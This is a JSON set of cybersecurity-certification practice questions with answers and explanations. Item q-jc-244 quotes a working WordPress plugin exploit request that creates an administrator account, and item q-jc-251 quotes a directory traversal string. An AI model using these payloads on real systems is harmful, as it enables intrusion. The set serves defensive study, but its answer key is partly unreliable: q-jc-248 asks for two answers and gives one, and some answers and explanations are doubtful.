    "explanation": "The analyst should focus on the impact of the events in order to move the incident forward. Impact is\nthe measure of the potential or actual damage caused by an incident, such as data loss, financial loss,\nreputational damage, or regulatory penalties. Impact can help the analyst prioritize the events that\nneed to be investigated based on their severity and urgency, and allocate the appropriate resources\nand actions to contain and remediate them. Impact can also help the analyst communicate the status\nand progress of the incident to the stakeholders and customers, and justify the decisions and\nrecommendations made during the incident response12. Vulnerability score, mean time to detect,\nand isolation are all important metrics or actions for incident response, but they are not the main\nfocus for moving the incident forward. Vulnerability score is the rating of the likelihood and severity\nof a vulnerability being exploited by a threat actor. Mean time to detect is the average time it takes\nto discover an incident. Isolation is the process of disconnecting an affected system from the network\nto prevent further damage or spread of the incident34 . Reference: Incident Response: Processes,\nBest Practices & Tools - Atlassian, Incident Response Metrics: What You Should Be Measuring,\nVulnerability Scanning Best Practices, How to Track Mean Time to Detect (MTTD) and Mean Time to\nRespond (MTTR) to Cybersecurity Incidents, [Isolation and Quarantine for Incident Response]",
    "image": null
  },
  {
    "id": "q-jc-234",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security team is concerned about recent Layer 4 DDoS attacks against the company website. Which\nof the following controls would best mitigate the attacks?",
    "options": [
      "A. Block the attacks using firewall rules.",
      "B. Deploy an IPS in the perimeter network.",
      "C. Roll out a CDN.",
      "D. Implement a load balancer."
    ],
    "answer": "C",
    "explanation": "Rolling out a CDN is the best control to mitigate the Layer 4 DDoS attacks against the company\nwebsite. A CDN is a Content Delivery Network, which is a system of distributed servers that deliver\nweb content to users based on their geographic location, the origin of the web page, and the content\ndelivery server. A CDN can help protect against Layer 4 DDoS attacks, which are volumetric attacks\nthat aim to exhaust the network bandwidth or resources of the target website by sending a large\namount of traffic, such as SYN floods, UDP floods, or ICMP floods. A CDN can mitigate these attacks\nby distributing the traffic across multiple servers, caching the web content closer to the users,\nfiltering out malicious or unwanted traffic, and providing scalability and redundancy for the\nwebsite12. Reference: How to Stop a DDoS Attack: Mitigation Steps for Each OSI Layer, Application\nlayer DDoS attack | Cloudflare",
    "image": null
  },
  {
    "id": "q-jc-235",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following is a useful tool for mapping, tracking, and mitigating identified threats and\nvulnerabilities with the likelihood and impact of occurrence?",
    "options": [
      "A. Risk register",
      "B. Vulnerability assessment",
      "C. Penetration test",
      "D. Compliance report"
    ],
    "answer": "A",
    "explanation": "A risk register is a useful tool for mapping, tracking, and mitigating identified threats and\nvulnerabilities with the likelihood and impact of occurrence. A risk register is a document that\nrecords the details of all the risks identified in a project or an organization, such as their sources,\ncauses, consequences, probabilities, impacts, and mitigation strategies. A risk register can help the\nsecurity team to prioritize the risks based on their severity and urgency, and to monitor and control\nthem throughout the project or the organization’s lifecycle12. A vulnerability assessment, a\npenetration test, and a compliance report are all methods or outputs of identifying and evaluating\nthe threats and vulnerabilities, but they are not tools for mapping, tracking, and mitigating them345.\nReference: What is a Risk Register? | Smartsheet, Risk Register: Definition & Example, Vulnerability\nAssessment vs. Penetration Testing: What’s the Difference?, What is a Penetration Test and How\nDoes It Work?, What is a Compliance Report? | Definition, Types, and Examples",
    "image": null
  },
  {
    "id": "q-jc-236",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst has found a moderate-risk item in an organization's point-of-sale application. The\norganization is currently in a change freeze window and has decided that the risk is not high enough\nto correct at this time. Which of the following inhibitors to remediation does this scenario illustrate?",
    "options": [
      "A. Service-level agreement",
      "B. Business process interruption",
      "C. Degrading functionality",
      "D. Proprietary system"
    ],
    "answer": "B",
    "explanation": "Business process interruption is the inhibitor to remediation that this scenario illustrates. Business\nprocess interruption is when the remediation of a vulnerability or an incident requires the disruption\nor suspension of a critical or essential business process, such as the point-of-sale application. This\ncan cause operational, financial, or reputational losses for the organization, and may outweigh the\nbenefits of the remediation. Therefore, the organization may decide to postpone or avoid the\nremediation until a more convenient time, such as a change freeze window, which is a period of time\nwhen no changes are allowed to the IT environment12. Service-level agreement, degrading\nfunctionality, and proprietary system are other possible inhibitors to remediation, but they are not\nrelevant to this scenario. Service-level agreement is when the remediation of a vulnerability or an\nincident violates or affects the contractual obligations or expectations of the service provider or the\ncustomer. Degrading functionality is when the remediation of a vulnerability or an incident reduces\nor impairs the performance or usability of a system or an application. Proprietary system is when the\nremediation of a vulnerability or an incident involves a system or an application that is owned or\ncontrolled by a third party, and the organization has limited or no access or authority to modify it3.\nReference: Inhibitors to Remediation — SOC Ops Simplified, Remediation Inhibitors - CompTIA\nCySA+, Information security Vulnerability Management Report (Remediation…",
    "image": null
  },
  {
    "id": "q-jc-237",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company has a primary control in place to restrict access to a sensitive database. However, the\ncompany discovered an authentication vulnerability that could bypass this control. Which of the\nfollowing is the best compensating control?",
    "options": [
      "A. Running regular penetration tests to identify and address new vulnerabilities",
      "B. Conducting regular security awareness training of employees to prevent social engineering attacks",
      "C. Deploying an additional layer of access controls to verify authorized individuals",
      "D. Implementing intrusion detection software to alert security teams of unauthorized access\nattempts"
    ],
    "answer": "C",
    "explanation": "Deploying an additional layer of access controls to verify authorized individuals is the best\ncompensating control for the authentication vulnerability that could bypass the primary control. A\ncompensating control is a security measure that is implemented to mitigate the risk of a vulnerability\nor a threat when the primary control is not sufficient or feasible. A compensating control should\nprovide a similar or greater level of protection as the primary control, and should be closely related\nto the vulnerability or the threat it is addressing1. In this case, the primary control is to restrict access\nto a sensitive database, and the vulnerability is an authentication bypass. Therefore, the best\ncompensating control is to deploy an additional layer of access controls, such as multifactor\nauthentication, role-based access control, or encryption, to verify the identity and the authorization\nof the individuals who are accessing the database. This way, the compensating control can prevent\nunauthorized access to the database, even if the primary control is bypassed23. Running regular\npenetration tests, conducting regular security awareness training, and implementing intrusion\ndetection software are all good security practices, but they are not compensating controls for the\nauthentication vulnerability, as they do not provide a similar or greater level of protection as the\nprimary control, and they are not closely related to the vulnerability or the threat they are\naddressing. Reference: Compensating Controls: An Impermanent Solution to an IT … - Tripwire, What\nis Multifactor Authentication (MFA)? | Duo Security, Role-Based Access Control (RBAC) and Role-\nBased Security, [What is a Penetration Test and How Does It Work?]",
    "image": null
  },
  {
    "id": "q-jc-238",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A company is concerned with finding sensitive file storage locations that are open to the public. The\ncurrent internal cloud network is flat. Which of the following is the best solution to secure the\nnetwork?",
    "options": [
      "A. Implement segmentation with ACLs.",
      "B. Configure logging and monitoring to the SIEM.",
      "C. Deploy MFA to cloud storage locations.",
      "D. Roll out an IDS."
    ],
    "answer": "A",
    "explanation": "Implementing segmentation with ACLs is the best solution to secure the network. Segmentation is\nthe process of dividing a network into smaller subnetworks, or segments, based on criteria such as\nfunction, location, or security level. Segmentation can help improve the network performance,\nscalability, and manageability, as well as enhance the network security by isolating the sensitive or\ncritical data and systems from the rest of the network. ACLs are Access Control Lists, which are rules\nor policies that specify which users, devices, or applications can access a network segment or\nresource, and which actions they can perform. ACLs can help enforce the principle of least privilege,\nand prevent unauthorized or malicious access to the network segments or resources12. Configuring\nlogging and monitoring to the SIEM, deploying MFA to cloud storage locations, and rolling out an IDS\nare all good security practices, but they are not the best solution to secure the network. Logging and\nmonitoring to the SIEM can help detect and analyze the network events and incidents, but they do\nnot prevent them. MFA can help authenticate the users who access the cloud storage locations, but it\ndoes not protect the network from attacks or breaches. IDS can help identify and alert the network\nintrusions, but it does not block them34 . Reference: Network Segmentation: What It Is and How to\nDo It Right, What is an Access Control List (ACL)? | IBM, What is SIEM? | Microsoft Security, What is\nMultifactor Authentication (MFA)? | Duo Security, [What is an Intrusion Detection System (IDS)? |\nIBM]",
    "image": null
  },
  {
    "id": "q-jc-239",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst reviews the following Arachni scan results for a web application that stores PII\ndata:\nWhich of the following should be remediated first?",
    "options": [
      "A. SQL injection",
      "B. RFI",
      "C. XSS",
      "D. Code injection"
    ],
    "answer": "A",
    "explanation": "SQL injection should be remediated first, as it is a high-severity vulnerability that can allow an\nattacker to execute arbitrary SQL commands on the database server and access, modify, or delete\nsensitive data, including PII. According to the Arachni scan results, there are two instances of SQL\ninjection and three instances of blind SQL injection (two timing attacks and one differential analysis)\nin the web application. These vulnerabilities indicate that the web application does not properly\nvalidate or sanitize the user input before passing it to the database server, and thus exposes the\ndatabase to malicious queries12. SQL injection can have serious consequences for the confidentiality,\nintegrity, and availability of the data and the system, and can also lead to further attacks, such as\nprivilege escalation, data exfiltration, or remote code execution34. Therefore, SQL injection should\nbe the highest priority for remediation, and the web application should implement input validation,\nparameterized queries, and least privilege principle to prevent SQL injection attacks5. Reference:\nWeb application testing with Arachni | Infosec, How do I create a generated scan report for PDF in\nArachni Web …, Command line user interface · Arachni/arachni Wiki · GitHub, SQL Injection - OWASP,\nBlind SQL Injection - OWASP, SQL Injection Attack: What is it, and how to prevent it., SQL Injection\nCheat Sheet & Tutorial | Veracode",
    "image": "images/page_188_img_2.jpeg"
  },
  {
    "id": "q-jc-240",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A systems administrator receives reports of an internet-accessible Linux server that is running very\nsluggishly. The administrator examines the server, sees a high amount of memory utilization, and\nsuspects a DoS attack related to half-open TCP sessions consuming memory. Which of the following\ntools would best help to prove whether this server was experiencing this behavior?",
    "options": [
      "A. Nmap",
      "B. TCPDump",
      "C. SIEM",
      "D. EDR"
    ],
    "answer": "B",
    "explanation": "TCPDump is the best tool to prove whether the server was experiencing a DoS attack related to half-\nopen TCP sessions consuming memory. TCPDump is a command-line tool that can capture and\nanalyze network traffic, such as TCP, UDP, and ICMP packets. TCPDump can help the administrator to\nidentify the source and destination of the traffic, the TCP flags and sequence numbers, the packet\nsize and frequency, and other information that can indicate a DoS attack. A DoS attack related to half-\nopen TCP sessions is also known as a SYN flood attack, which is a type of volumetric attack that aims\nto exhaust the network bandwidth or resources of the target server by sending a large amount of TCP\nSYN requests and ignoring the TCP SYN-ACK responses. This creates a backlog of half-open\nconnections on the server, which consume memory and CPU resources, and prevent legitimate\nconnections from being established12. TCPDump can help the administrator to detect a SYN flood\nattack by looking for a high number of TCP SYN packets with different source IP addresses, a low\nnumber of TCP SYN-ACK packets, and a very low number of TCP ACK packets34. Reference: SYN flood\nDDoS attack | Cloudflare, What is a SYN flood attack and how to prevent it? | NETSCOUT, TCPDump -\nA Powerful Tool for Network Analysis and Security, How to Detect a SYN Flood Attack with TCPDump",
    "image": null
  },
  {
    "id": "q-jc-241",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An organization is conducting a pilot deployment of an e-commerce application. The application's\nsource code is not available. Which of the following strategies should an analyst recommend to\nevaluate the security of the software?",
    "options": [
      "A. Static testing",
      "B. Vulnerability testing",
      "C. Dynamic testing",
      "D. Penetration testing"
    ],
    "answer": "D",
    "explanation": "Penetration testing is the best strategy to evaluate the security of the software without the source\ncode. Penetration testing is a type of security testing that simulates real-world attacks on the\nsoftware to identify and exploit its vulnerabilities. Penetration testing can be performed on the\nsoftware as a black box, meaning that the tester does not need to have access to the source code or\nthe internal structure of the software. Penetration testing can help the analyst to assess the security\nposture of the software, the potential impact of the vulnerabilities, and the effectiveness of the\nexisting security controls12. Static testing, vulnerability testing, and dynamic testing are other types\nof security testing, but they usually require access to the source code or the internal structure of the\nsoftware. Static testing is the analysis of the software code or design without executing it.\nVulnerability testing is the identification and evaluation of the software weaknesses or flaws.\nDynamic testing is the analysis of the software code or design while executing it345. Reference:\nPenetration Testing - OWASP, What is a Penetration Test and How Does It Work?, Static Code Analysis\n| OWASP Foundation, Vulnerability Scanning Best Practices, Dynamic Testing - OWASP",
    "image": null
  },
  {
    "id": "q-jc-242",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Two employees in the finance department installed a freeware application that contained embedded\nmalware. The network is robustly segmented based on areas of responsibility. These computers had\ncritical sensitive information stored locally that needs to be recovered. The department manager\nadvised all department employees to turn off their computers until the security team could be\ncontacted about the issue. Which of the following is the first step the incident response staff\nmembers should take when they arrive?",
    "options": [
      "A. Turn on all systems, scan for infection, and back up data to a USB storage device.",
      "B. Identify and remove the software installed on the impacted systems in the department.",
      "C. Explain that malware cannot truly be removed and then reimage the devices.",
      "D. Log on to the impacted systems with an administrator account that has privileges to perform\nbackups.",
      "E. Segment the entire department from the network and review each computer offline."
    ],
    "answer": "E",
    "explanation": "Segmenting the entire department from the network and reviewing each computer offline is the first\nstep the incident response staff members should take when they arrive. This step can help contain\nthe malware infection and prevent it from spreading to other systems or networks. Reviewing each\ncomputer offline can help identify the source and scope of the infection, and determine the best\ncourse of action for recovery12. Turning on all systems, scanning for infection, and backing up data to\na USB storage device is a risky step, as it can activate the malware and cause further damage or data\nloss. It can also compromise the USB storage device and any other system that connects to it.\nIdentifying and removing the software installed on the impacted systems in the department is a\npossible step, but it should be done after segmenting the department from the network and\nreviewing each computer offline. Explaining that malware cannot truly be removed and then\nreimaging the devices is a drastic step, as it can result in data loss and downtime. It should be done\nonly as a last resort, and after backing up the data and verifying its integrity. Logging on to the\nimpacted systems with an administrator account that has privileges to perform backups is a\ndangerous step, as it can expose the administrator credentials and privileges to the malware, and\nallow it to escalate its access and capabilities34. Reference: Incident Response: Processes, Best\nPractices & Tools - Atlassian, Incident Response Best Practices | SANS Institute, Malware Removal:\nHow to Remove Malware from Your Device, How to Remove Malware From Your PC | PCMag",
    "image": null
  },
  {
    "id": "q-jc-243",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following actions would an analyst most likely perform after an incident has been\ninvestigated?",
    "options": [
      "A. Risk assessment",
      "B. Root cause analysis",
      "C. Incident response plan",
      "D. Tabletop exercise"
    ],
    "answer": "D",
    "explanation": "A tabletop exercise is the most likely action that an analyst would perform after an incident has been\ninvestigated. A tabletop exercise is a simulation of a potential incident scenario that involves the key\nstakeholders and decision-makers of the organization. The purpose of a tabletop exercise is to\nevaluate the effectiveness of the incident response plan, identify the gaps and weaknesses in the\nplan, and improve the communication and coordination among the incident response team and\nother parties. A tabletop exercise can help the analyst to learn from the incident investigation, test\nthe assumptions and recommendations made during the investigation, and enhance the\npreparedness and resilience of the organization for future incidents12. Risk assessment, root cause\nanalysis, and incident response plan are all actions that an analyst would perform before or during an\nincident investigation, not after. Risk assessment is the process of identifying, analyzing, and\nevaluating the risks that may affect the organization. Root cause analysis is the method of finding the\nunderlying or fundamental causes of an incident. Incident response plan is the document that\ndefines the roles, responsibilities, procedures, and resources for responding to an incident345.\nReference: Tabletop Exercises: Six Scenarios to Help Prepare Your Cybersecurity Team, Tabletop\nExercises for Incident Response - SANS Institute, Risk Assessment - NIST, Root Cause Analysis -\nOWASP, Incident Response Plan | Ready.gov",
    "image": null
  },
  {
    "id": "q-jc-244",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst has received an IPS event notification from the SIEM stating an IP address, which is known\nto be malicious, has attempted to exploit a zero-day vulnerability on several web servers. The exploit\ncontained the following snippet:\n/wp-json/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator\nWhich of the following controls would work best to mitigate the attack represented by this snippet?",
    "options": [
      "A. Limit user creation to administrators only.",
      "B. Limit layout creation to administrators only.",
      "C. Set the directory trx_addons to read only for all users.",
      "D. Set the directory v2 to read only for all users."
    ],
    "answer": "A",
    "explanation": "Limiting user creation to administrators only would work best to mitigate the attack represented by\nthis snippet. The snippet shows an attempt to exploit a zero-day vulnerability in the ThemeREX\nAddons WordPress plugin, which allows remote code execution by invoking arbitrary PHP functions\nvia the REST-API endpoint /wp-json/trx_addons/V2/get/sc_layout. In this case, the attacker tries to\nuse the wp_insert_user function to create a new administrator account on the WordPress site12.\nLimiting user creation to administrators only would prevent the attacker from succeeding, as they\nwould need to provide valid administrator credentials to create a new user. This can be done by using\na plugin or a code snippet that restricts user registration to administrators34. Limiting layout creation\nto administrators only, setting the directory trx_addons to read only for all users, and setting the\ndirectory v2 to read only for all users are not effective controls to mitigate the attack, as they do not\naddress the core of the vulnerability, which is the lack of input validation and sanitization on the\nREST-API endpoint. Moreover, setting directories to read only may affect the functionality of the\nplugin or the WordPress site56. Reference: Zero-Day Vulnerability in ThemeREX Addons Now Patched\n- Wordfence, Mitigating Zero Day Attacks With a Detection, Prevention … - Spiceworks, How to\nRestrict WordPress User Registration to Specific Email …, How to Limit WordPress User Registration\nto Specific Domains, WordPress File Permissions: A Guide to Securing Your Website, WordPress File\nPermissions: What is the Ideal Setting?",
    "image": null
  },
  {
    "id": "q-jc-245",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company recently removed administrator rights from all of its end user workstations. An analyst\nuses CVSSv3.1 exploitability metrics to prioritize the vulnerabilities for the workstations and\nproduces the following information:\nWhich of the following vulnerabilities should be prioritized for remediation?",
    "options": [
      "A. nessie.explosion",
      "B. vote.4p",
      "C. sweet.bike",
      "D. great.skills"
    ],
    "answer": "A",
    "explanation": "nessie.explosion should be prioritized for remediation, as it has the highest CVSSv3.1 exploitability\nscore of 8.6. The exploitability score is a sub-score of the CVSSv3.1 base score, which reflects the\nease and technical means by which the vulnerability can be exploited. The exploitability score is\ncalculated based on four metrics: Attack Vector, Attack Complexity, Privileges Required, and User\nInteraction. The higher the exploitability score, the more likely and feasible the vulnerability is to be\nexploited by an attacker12. nessie.explosion has the highest exploitability score because it has the\nlowest values for all four metrics: Network (AV:N), Low (AC:L), None (PR:N), and None (UI:N). This\nmeans that the vulnerability can be exploited remotely over the network, without requiring any user\ninteraction or privileges, and with low complexity. Therefore, nessie.explosion poses the greatest\nthreat to the end user workstations, and should be remediated first. vote.4p, sweet.bike, and\ngreat.skills have lower exploitability scores because they have higher values for some of the metrics,\nsuch as Adjacent Network (AV:A), High (AC:H), Low (PR:L), or Required (UI:R). This means that the\nvulnerabilities are more difficult or less likely to be exploited, as they require physical proximity, user\ninvolvement, or some privileges34. Reference: CVSS v3.1 Specification Document - FIRST, NVD - CVSS\nv3 Calculator, CVSS v3.1 User Guide - FIRST, CVSS v3.1 Examples - FIRST",
    "image": "images/page_195_img_2.jpeg"
  },
  {
    "id": "q-jc-246",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A recent vulnerability scan resulted in an abnormally large number of critical and high findings that\nrequire patching. The SLA requires that the findings be remediated within a specific amount of time.\nWhich of the following is the best approach to ensure all vulnerabilities are patched in accordance\nwith the SLA?",
    "options": [
      "A. Integrate an IT service delivery ticketing system to track remediation and closure.",
      "B. Create a compensating control item until the system can be fully patched.",
      "C. Accept the risk and decommission current assets as end of life.",
      "D. Request an exception and manually patch each system."
    ],
    "answer": "A",
    "explanation": "Integrating an IT service delivery ticketing system to track remediation and closure is the best\napproach to ensure all vulnerabilities are patched in accordance with the SLA. A ticketing system is a\nsoftware tool that helps manage, organize, and track the tasks and workflows related to IT service\ndelivery, such as incident management, problem management, change management, and\nvulnerability management. A ticketing system can help the security team to prioritize, assign,\nmonitor, and document the remediation of the vulnerabilities, and to ensure that they are\ncompleted within the specified time frame and quality standards. A ticketing system can also help\nthe security team to communicate and collaborate with other teams, such as the IT operations team,\nthe development team, and the business stakeholders, and to report on the status and progress of\nthe remediation efforts12. Creating a compensating control item, accepting the risk, and requesting\nan exception are not the best approaches to ensure all vulnerabilities are patched in accordance with\nthe SLA, as they do not address the root cause of the problem, which is the large number of critical\nand high findings that require patching. These approaches may also introduce more risks or\nchallenges for the security team, such as compliance issues, resource constraints, or business\nimpacts3 . Reference: What is a Ticketing System? | Freshservice ITSM Glossary, Vulnerability\nManagement Best Practices, Compensating Controls: An Impermanent Solution to an IT … - Tripwire,\n[Risk Acceptance in Information Security - Infosec Resources], [Exception Management - ISACA]",
    "image": null
  },
  {
    "id": "q-jc-247",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A team of analysts is developing a new internal system that correlates information from a variety of\nsources analyzes that information, and then triggers notifications according to company policy Which\nof the following technologies was deployed?",
    "options": [
      "A. SIEM",
      "B. SOAR",
      "C. IPS",
      "D. CERT"
    ],
    "answer": "A",
    "explanation": "SIEM (Security Information and Event Management) technology aggregates and analyzes activity\nfrom many different resources across your IT infrastructure. The description of correlating\ninformation from various sources and triggering notifications aligns with the capabilities of a SIEM\nsystem.",
    "image": "images/page_198_img_2.jpeg"
  },
  {
    "id": "q-jc-248",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst received an alert regarding multiple successful MFA log-ins for a particular user\nWhen reviewing the authentication logs the analyst sees the following:\nWhich of the following are most likely occurring, based on the MFA logs? (Select two).",
    "options": [
      "A. Dictionary attack",
      "B. Push phishing",
      "C. impossible geo-velocity",
      "D. Subscriber identity module swapping",
      "E. Rogue access point",
      "F. Password spray"
    ],
    "answer": "C",
    "explanation": "C. Impossible geo-velocity is the correct answer. This event occurs when a user account authenticates successfully from two geographically distant locations within a time window that makes physical travel impossible (e.g., New York and Tokyo within 30 minutes). This is a key indicator of compromised credentials being used by an attacker in a different location. MFA was bypassed, suggesting the attacker obtained or intercepted push notification codes. Dictionary attack (A) involves systematic password guessing, not successful MFA bypasses. Push phishing (B) tricks users into approving MFA — possible, but impossible geo-velocity specifically describes the pattern seen in logs. SIM swapping (D) intercepts SMS-based MFA. Password spray (F) targets many accounts.",
    "image": "images/page_198_img_2.jpeg"
  },
  {
    "id": "q-jc-249",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An attacker recently gained unauthorized access to a financial institution's database, which contains\nconfidential information. The attacker exfiltrated a large amount of data before being detected and\nblocked. A security analyst needs to complete a root cause analysis to determine how the attacker\nwas able to gain access. Which of the following should the analyst perform first?",
    "options": [
      "A. Document the incident and any findings related to the attack for future reference.",
      "B. Interview employees responsible for managing the affected systems.",
      "C. Review the log files that record all events related to client applications and user access.",
      "D. Identify the immediate actions that need to be taken to contain the incident and minimize\ndamage."
    ],
    "answer": "C",
    "explanation": "In a root cause analysis following unauthorized access, the initial step is usually to review relevant\nlog files. These logs can provide critical information about how and when the attacker gained access.\nThe first step in a root cause analysis after a data breach is typically to review the logs. This helps the\nanalyst understand how the attacker gained access by providing a detailed record of all events,\nincluding unauthorized or abnormal activities. Documenting the incident, interviewing employees,\nand identifying immediate containment actions are important steps, but they usually follow the\ninitial log review.",
    "image": null
  },
  {
    "id": "q-jc-250",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security analyst is responding to an indent that involves a malicious attack on a network. Data\ncloset. Which of the following best explains how are analyst should properly document the incident?",
    "options": [
      "A. Back up the configuration file for alt network devices",
      "B. Record and validate each connection",
      "C. Create a full diagram of the network infrastructure",
      "D. Take photos of the impacted items"
    ],
    "answer": "D",
    "explanation": "When documenting a physical incident in a network data closet, taking photos provides a clear and\nimmediate record of the situation, which is essential for thorough incident documentation and\nsubsequent investigation.\nProper documentation of an incident in a data closet should include taking photos of the impacted\nitems. This provides visual evidence and helps in understanding the physical context of the incident,\nwhich is crucial for a thorough investigation. Backing up configuration files, recording connections,\nand creating network diagrams, while important, are not the primary means of documenting the\nphysical aspects of an incident.",
    "image": null
  },
  {
    "id": "q-jc-251",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "While reviewing the web server logs a security analyst notices the following snippet\n..\\../..\\../boot.ini\nWhich of the following is being attempted?",
    "options": [
      "A. Directory traversal",
      "B. Remote file inclusion",
      "C. Cross-site scripting",
      "D. Remote code execution",
      "E. Enumeration of/etc/pasawd"
    ],
    "answer": "A",
    "explanation": "The log entry \"......\\boot.ini\" is indicative of a directory traversal attack, where an attacker attempts\nto access files and directories that are stored outside the web root folder.\nThe log snippet \"......\\boot.ini\" is indicative of a directory traversal attack. This type of attack aims to\naccess files and directories that are stored outside the web root folder. By manipulating variables\nthat reference files with “../” (dot-dot-slash), the attacker may be able to access arbitrary files and\ndirectories stored on the file system.",
    "image": null
  },
  {
    "id": "q-jc-252",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A manufacturer has hired a third-party consultant to assess the security of an OT network that\nincludes both fragile and legacy equipment Which of the following must be considered to ensure the\nconsultant does no harm to operations?",
    "options": [
      "A. Employing Nmap Scripting Engine scanning techniques",
      "B. Preserving the state of PLC ladder logic prior to scanning",
      "C. Using passive instead of active vulnerability scans",
      "D. Running scans during off-peak manufacturing hours"
    ],
    "answer": "C",
    "explanation": "In environments with fragile and legacy equipment, passive scanning is preferred to prevent any\npotential disruptions that active scanning might cause.\nWhen assessing the security of an Operational Technology (OT) network, especially one with fragile\nand legacy equipment, it's crucial to use passive instead of active vulnerability scans. Active scanning\ncan sometimes disrupt the operation of sensitive or older equipment. Passive scanning listens to\nnetwork traffic without sending probing requests, thus minimizing the risk of disruption.",
    "image": "images/page_203_img_2.jpeg"
  },
  {
    "id": "q-jc-253",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A cybersecurity analyst is recording the following details\n* ID\n* Name\n* Description\n* Classification of information\n* Responsible party\nIn which of the following documents is the analyst recording this information?",
    "options": [
      "A. Risk register",
      "B. Change control documentation",
      "C. Incident response playbook",
      "D. Incident response plan"
    ],
    "answer": "A",
    "explanation": "A risk register typically contains details like ID, name, description, classification of information, and\nresponsible party. It’s used for tracking identified risks and managing them.\nRecording details like ID, Name, Description, Classification of information, and Responsible party is\ntypically done in a Risk Register. This document is used to identify, assess, manage, and monitor risks\nwithin an organization. It's not directly related to incident response or change control\ndocumentation.",
    "image": "images/page_203_img_2.jpeg"
  },
  {
    "id": "q-jc-254",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A threat hunter seeks to identify new persistence mechanisms installed in an organization's\nenvironment. In collecting scheduled tasks from all enterprise workstations, the following host\ndetails are aggregated:\nWhich of the following actions should the hunter perform first based on the details above?",
    "options": [
      "A. Acquire a copy of taskhw.exe from the impacted host",
      "B. Scan the enterprise to identify other systems with taskhw.exe present",
      "C. Perform a public search for malware reports on taskhw.exe.",
      "D. Change the account that runs the -caskhw. exe scheduled task"
    ],
    "answer": "C",
    "explanation": "The first step should be to perform a public search for malware reports on taskhw.exe, as this file is\nsuspicious for several reasons: it is located in a non-standard path, it has a high CPU usage, it is\nsigned by an unknown entity, and it is only present on one host. A public search can help to\ndetermine if this file is a known malware or a legitimate program. If it is malware, the hunter can\nthen take appropriate actions to remove it and prevent further damage. The other options are either\npremature or ineffective, as they do not provide enough information to assess the threat level of\ntaskhw.exe. Reference: Cybersecurity Analyst+ - CompTIA, taskhw.exe Windows process - What is it?\n- file.net, Taskhostw.exe - What Is Taskhostw.exe & Is It Malware? - MalwareTips Forums",
    "image": "images/page_203_img_2.jpeg"
  },
  {
    "id": "q-jc-255",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst is designing a message system for a bank. The analyst wants to include a feature that\nallows the recipient of a message to prove to a third party that the message came from the sender\nWhich of the following information security goals is the analyst most likely trying to achieve?",
    "options": [
      "A. Non-repudiation",
      "B. Authentication",
      "C. Authorization",
      "D. Integrity"
    ],
    "answer": "A",
    "explanation": "Non-repudiation ensures that a message sender cannot deny the authenticity of their sent message.\nThis is crucial in banking communications for legal and security reasons.\nThe goal of allowing a message recipient to prove the message's origin is non-repudiation. This\nensures that the sender cannot deny the authenticity of their message. Non-repudiation is a\nfundamental aspect of secure messaging systems, especially in banking and financial\ncommunications.",
    "image": null
  },
  {
    "id": "q-jc-256",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Exploit code for a recently disclosed critical software vulnerability was publicly available (or\ndownload for several days before being removed. Which of the following CVSS v.3.1 temporal\nmetrics was most impacted by this exposure?",
    "options": [
      "A. Remediation level",
      "B. Exploit code maturity",
      "C. Report confidence",
      "D. Availability"
    ],
    "answer": "B",
    "explanation": "Exploit code maturity in the CVSS v.3.1 temporal metrics refers to the reliability and availability of\nexploit code for a vulnerability. Public availability of exploit code increases the exploit code maturity\nscore.\nThe availability of exploit code affects the 'Exploit Code Maturity' metric in CVSS v.3.1. This metric\nevaluates the level of maturity of the exploit that targets the vulnerability. When exploit code is\nreadily available, it suggests a higher level of maturity, indicating that the exploit is more reliable and\neasier to use.",
    "image": null
  },
  {
    "id": "q-jc-257",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
